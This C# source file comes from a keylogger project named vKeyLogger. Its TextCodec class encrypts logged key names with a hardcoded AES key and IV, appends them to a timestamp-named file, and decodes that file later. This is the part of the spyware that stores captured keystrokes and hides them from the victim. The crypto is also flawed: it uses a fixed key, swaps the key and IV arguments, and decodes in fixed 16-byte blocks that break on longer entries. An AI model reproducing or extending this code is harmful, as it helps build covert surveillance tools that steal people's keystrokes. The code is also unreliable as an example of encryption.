using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vKeyLogger.APIHandler;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace vKeyLogger.Crypto
{
    public partial class TextCodec
    {
        string fileName;

        public TextCodec(DateTime d)
        {
            this.fileName = d.ToString();
            this.fileName = this.fileName.Replace(" ", "_");
            this.fileName = this.fileName.Replace(":", "_");
        }

        public string FileName
        {
            get
            {
                return fileName;
            }
        }

        public void EncodeToFile(string keyName)
        {
            UTF8Encoding utf = new UTF8Encoding();
            Rijndael rjn = Rijndael.Create();
            Byte[] encIV = {255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255};
            Byte[] encKey = {0x3,0x6,0x9,0x12,0x15,0x18,0x21,0x24,0x27,0x30,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF};
            rjn.IV = encIV;
            rjn.Key = encKey;
            ICryptoTransform encoder = rjn.CreateEncryptor(encIV,encKey);
            ICryptoTransform decoder = rjn.CreateDecryptor();

            Byte[] keyBin = utf.GetBytes(keyName);
            Byte[] encBinData = encoder.TransformFinalBlock(keyBin, 0, keyBin.Length);
            FileStream fOpen = File.Open(this.fileName, FileMode.OpenOrCreate, FileAccess.Write);
            fOpen.Seek(fOpen.Length, SeekOrigin.Begin);
            long pos = fOpen.Position;
            fOpen.Write(encBinData, 0, encBinData.Length);
            fOpen.Close();
        }

        public string DecodeFromFile(string fileName)
        {
            string keyData = "";
            UTF8Encoding utf = new UTF8Encoding();
            Rijndael rjn = Rijndael.Create();
            Byte[] decIV = { 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255 };
            Byte[] decKey = { 0x3, 0x6, 0x9, 0x12, 0x15, 0x18, 0x21, 0x24, 0x27, 0x30, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
            rjn.IV = decIV;
            rjn.Key = decKey;
            ICryptoTransform decoder = rjn.CreateDecryptor(decIV, decKey);


            FileStream fOpen = File.Open(fileName, FileMode.OpenOrCreate, FileAccess.Read);
            Byte[] encBinData = new Byte[16];
            Byte[] decBinData;
            int i =0;
            for (i = 0; i < fOpen.Length; i += 16)
            {
                fOpen.Seek((long)i, SeekOrigin.Begin);
                fOpen.Read(encBinData, 0, 16);
                decBinData = decoder.TransformFinalBlock(encBinData, 0, encBinData.Length);
                keyData += utf.GetString(decBinData);
            }
            fOpen.Close();
            return keyData;
        }
    }
}
